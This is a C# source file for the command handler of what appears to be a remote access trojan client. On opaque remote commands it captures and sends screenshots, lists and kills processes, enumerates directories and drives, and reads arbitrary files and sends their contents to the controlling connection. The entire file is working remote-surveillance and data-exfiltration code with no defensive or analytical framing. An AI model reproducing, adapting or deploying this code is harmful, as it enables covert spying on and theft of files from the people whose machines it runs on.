namespace Core.Command
{
    using Core.Screenshot;
    using Core.Connection;
    using System;
    using System.Diagnostics;
    using System.Threading;
    using System.Text.RegularExpressions;
    using System.IO;
    using System.Linq;

    public class Command
    {
        private readonly Connection _connection;
        private readonly ScreenCapture _screenShot;

        private static string previousDirectory = string.Empty;

        public Command(Connection connection)
        {
            _connection = connection ?? throw new Exception("Error, Connection class cannot be null");
            _screenShot = new ScreenCapture();
        }

        public void ListDirectory(string directoryPattern)
        {
            if (!(Directory.Exists(directoryPattern) || File.Exists(directoryPattern)))
            {
                return;
            }

            var directoryFiles = Directory.GetFiles(directoryPattern);
            var directoryFolders = Directory.GetDirectories(directoryPattern);

            var singleFolder = string.Empty;
            var singleFile = string.Empty;

            foreach (var folder in directoryFolders)
            {
                singleFolder = folder.Contains("\\") ? folder.Split('\\').LastOrDefault() : singleFolder;

                _connection?.SendData(string.Format(
                    "|listado|{0}|{1}|{2}|{3}|",
                    singleFolder,
                    "Carpeta",
                    folder,
                    "0"));

                Thread.Sleep(10);
            }

            foreach (var file in directoryFiles)
            {
                singleFile = file.Contains("\\") ? file.Split('\\').LastOrDefault() : file;

                _connection?.SendData(string.Format(
                    "|listado|{0}|{1}|{2}|{3}|",
                    singleFile,
                    "Archivo",
                    file,
                    new FileInfo(file).Length));

                Thread.Sleep(10);
            }

            previousDirectory = directoryPattern;

            return;
        }

        public void DetectCommand(string commandReceived)
        {
            try
            {
                if (commandReceived.Contains("ssr"))
                {
                    var screenBuffer = _screenShot.FullScreenshot().GetBuffer();
                    var sizeScreen = screenBuffer.Length;

                    _connection?.SendData(string.Format("|archivo|{0}|img.jpg|", sizeScreen));
                    _connection?.SendData(screenBuffer);

                    return;
                }

                if (commandReceived.Contains("lis"))
                {
                    var processlist = Process.GetProcesses();

                    foreach (var theprocess in processlist)
                    {
                        var processString = string.Format(
                            "|proceso|{0}|{1}|{2}|",
                            theprocess.ProcessName,
                            theprocess.MainWindowTitle
                            /*theprocess.MainModule.FileName*/,
                            theprocess.Id);

                        _connection?.SendData(processString);

                        Thread.Sleep(10);
                    }
                }

                if (commandReceived.StartsWith("tas"))
                {
                    var processName = Regex.Split(commandReceived, "tas")[1];
                    var result = Process.GetProcessesByName(processName);

                    foreach (var process in result)
                    {
                        process.Kill();
                    }

                    return;
                }

                if (commandReceived.Contains("diz"))
                {
                    var directoryName = commandReceived.Contains("\\") ?
                        commandReceived.TrimStart(new char[] { 'd', 'i', 'z' }) : Regex.Split(commandReceived, "diz")[1];

                    if (int.TryParse(directoryName, out int id))
                    {
                        var winDirDirectory = string.Format("{0}\\", Environment.GetEnvironmentVariable("windir"));

                        switch (directoryName)
                        {
                            case "1":
                                ListDirectory(winDirDirectory);
                                break;

                            case "7":
                                var logicalDrivers = DriveInfo.GetDrives();

                                foreach (var drive in logicalDrivers)
                                {
                                    var driveType = string.Empty;

                                    if (!drive.IsReady) continue;

                                    switch (drive.DriveType)
                                    {
                                        case DriveType.CDRom:
                                            driveType = "CD-ROM";
                                            break;

                                        case DriveType.Fixed:
                                            driveType = "Disco duro";
                                            break;

                                        case DriveType.Removable:
                                            driveType = "Disco extraible";
                                            break;

                                        case DriveType.Ram:
                                            driveType = "Ram";
                                            break;

                                        case DriveType.Network:
                                            driveType = "Network";
                                            break;

                                        case DriveType.NoRootDirectory:
                                        case DriveType.Unknown:
                                            driveType = "Unknown";
                                            break;

                                    }

                                    var information = string.Format(
                                        "|listado|{0}|{1}|{2}|{3}|",
                                        drive.RootDirectory,
                                        driveType,
                                        drive.Name,
                                        string.Format("{0}/{1}/{2}", drive.AvailableFreeSpace, drive.TotalFreeSpace, drive.TotalSize));

                                    _connection?.SendData(information);

                                    Thread.Sleep(10);
                                }

                                break;
                        }
                    }
                    else
                    {
                        ListDirectory(directoryName);
                    }

                    return;
                }

                if (commandReceived.Contains("trx"))
                {
                    var fileName = Regex.Split(commandReceived, "trx")[1];

                    if (!File.Exists(fileName))
                    {
                        _connection?.SendData("Error sending the file specified");
                        return;
                    }

                    var fileSize = new FileInfo(fileName).Length;

                    var information = string.Format("|archivo|{0}|{1}|", fileSize, fileName.Split('\\').LastOrDefault());

                    using (var file = new StreamReader(fileName))
                    {
                        var buffer = file.ReadToEnd();

                        _connection?.SendData(information);
                        _connection?.SendData(buffer);
                    }

                    return;
                }
            }
            catch (Exception ex)
            {
                if (ex.Message.ToLower().Contains("denied"))
                {
                    _connection.SendData("Access Denied");
                    return;
                }

                throw ex;
            }

            Console.WriteLine(commandReceived);
        }
    }
}
